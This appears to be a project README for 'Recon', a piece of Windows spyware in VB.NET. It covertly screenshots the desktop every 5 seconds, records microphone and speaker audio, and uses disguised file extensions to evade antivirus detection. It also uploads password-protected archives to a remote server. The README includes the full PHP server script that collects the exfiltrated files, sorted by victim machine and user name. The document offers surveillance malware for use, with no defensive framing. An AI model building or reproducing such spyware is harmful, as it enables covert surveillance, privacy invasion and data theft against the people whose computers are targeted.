# Recon
### Basic spyware that can secretly take screenshots and record the audio input and output of the target computer.
  
  
- Recon is a Windows Form app written in VB.NET targeting the .NET Framework 4.7.2
- Recon takes a screenshot of the target computer desktop every 5 seconds, it saves screenshots in PNG format. The app uses [nQuant.Core.NETStandard](https://www.nuget.org/packages/nQuant.Core.NETStandard/1.0.0) and custom PNG encoder parameters to reduce the size of the generated PNG files thus optimizing the data upload speed.
- Recon uses [NAudio](https://github.com/naudio/NAudio) to capture the audio input and output into WAV streams.
- Recon uses [NAudio.Lame](https://github.com/Corey-M/NAudio.Lame) to convert WAV streams to MP3 in order to produce smaller audio files suitable for data exfiltration.
- The app uses custom file extensions so that it won't trigger AVs(rpng for PNG image files, rmp3 for MP3 files, and rzip for ZIP archive files).
- After generating the data, the app uses [DotNetZip](https://github.com/haf/DotNetZip.Semverd) to create a password-protected ZIP file to contain the exfiltrated data. The ZIP files will be uploaded to the remote server every 15 minutes using the **WebClient** class.
- The app uploads the generated screenshots and audio files to the remote server running the following PHP script:
```
<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

if (!isset($_POST)) exit(-1); // No POST data

if (isset($_GET['computer_id']) && !empty($_GET['computer_id'])) {
  $computerId = htmlspecialchars(trim($_GET['computer_id']), ENT_QUOTES); //Get target computer ID
} else {
  echo "No computer ID";
  exit(-1);
}

$data_dir = './data/';

$target_dir = $data_dir . $computerId;
if (!file_exists($target_dir))  mkdir(($target_dir));

$target_file = $target_dir . '/' . basename($_FILES["file"]["name"]);
$target_fileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

$uploadOk = 1;

// Check if file already exists
if (file_exists($target_file)) {
  echo "File already exists";
  $uploadOk = 0;
}

// Check file size
if ($_FILES["file"]["size"] > 250000000) { //250 MB limit
  echo "File exceeds the maximum size";
  $uploadOk = 0;
}

// Check file type
if ($target_fileType != "zip" && $target_fileType != "rzip") {
  echo "Only ZIP and RZIP files are allowed";
  $uploadOk = 0;
}

if ($uploadOk == 1) {

  $tmp_name = $_FILES["file"]["tmp_name"];

  if (move_uploaded_file($tmp_name, $target_file)) {
    echo "File uploaded successfully";
  } else {
    echo "Error uploading the file";
  }
}

```
- The app generates an ID for the target computer and sends it to the remote server; the ID consists of the machine name, user name, and OS version. The computer ID helps organize the uploaded data on the server.
